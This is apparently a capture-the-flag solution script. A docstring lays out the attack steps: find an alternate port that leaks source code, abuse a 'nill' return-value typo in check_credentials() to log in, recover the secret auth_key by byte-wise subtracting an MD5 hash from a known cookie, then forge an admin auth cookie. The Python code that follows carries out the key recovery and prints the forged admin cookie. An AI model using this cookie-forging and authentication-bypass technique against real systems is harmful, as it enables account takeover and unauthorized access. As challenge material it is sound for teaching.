"""
1. Examining http requests, you can see some assets are @ port 8327 instead of 8326
2. Visit the root page with that port and add goodboy to the querystrng, you can download all sourcecode from there
3. The function check_credentials() in auth.php has a typo. Instead of return value "null" it has "nill".
    If you type a password that does not pass the regex check, the function will return nill
    This can be exploited typing nill as user, so that the return value is the same as the user
4. Check the auth_cookie for nill. Knowing both auth_cookie and user_cookie, you can reverse engineer the
    create_auth_cookie() algorithm, in order to get the auth_key secret. This is done in the below code
5. When logged with nill user, you can see that the ultimate dish is only visible for the user admin.
    Using the auth_key you just found, you can get the cookie for admin.
    Set cookies for user=admin and auth={the cookie you just computed} and reload the root page, you will be ablo
    to access every secret including the secret dish
"""

from hashlib import md5


SUSPECT_HASH_INT = [56, 101, 55, 57, 56, 102, 48, 51, 55, 55, 99, 57, 57, 98, 99, 48]


def to_hash_int(word: str) -> list:
    """
    Returns the md5 hash of a word expressed as a list of the ascii codes of the 16 bytes
    :param word:
    :return:
    """
    hash_md5 = md5(word.encode())
    hash_int = [x for x in hash_md5.digest()]
    return hash_int


def substract_int_hashes(hash_1: list, hash_2: list) -> list:
    """
    Returns a list of the ascii codes resulting of substracting the ascii codes of two hashes, with modulo 256
    :param hash_1:
    :param hash_2:
    :return:
    """
    difference = [(x - y) % 256 for x, y in zip(hash_1, hash_2)]
    return difference


def add_int_hashes(hash_1: list, hash_2: list) -> list:
    """
        Returns a list of the ascii codes resulting of adding the ascii codes of two hashes, with modulo 256

    :param hash_1:
    :param hash_2:
    :return:
    """
    sum_list = [(x + y) % 256 for x, y in zip(hash_1, hash_2)]
    return sum_list


def int_hash_to_hex_str(int_hash: list) -> str:
    """
    Returns the md5 hash in hexadecimal format as a string
    :param int_hash:
    :return:
    """
    hex_str = ''.join('%02x' % i for i in int_hash)
    return hex_str


def fake_auth_cookie(word: str, auth_key: list) -> str:
    """
    Returns the cookie string resulting of BYTEWISE adding the hash md5 of a word to auth_key
    :param word:
    :param auth_key:
    :return:
    """
    hash_int = to_hash_int(word)
    hash_sum = add_int_hashes(auth_key, hash_int)
    secret_string = int_hash_to_hex_str(hash_sum)

    return secret_string


user_int = to_hash_int("nill")
auth_cookie_string = "1c919b2d62b178f3c713bb5431c57cc1"
auth_cookie_int = [int(auth_cookie_string[i:i+2], 16) for i in range(0, 32, 2)]

auth_key_int = substract_int_hashes(auth_cookie_int, user_int)

admin_cookie = fake_auth_cookie("admin", auth_key_int)

print(admin_cookie)
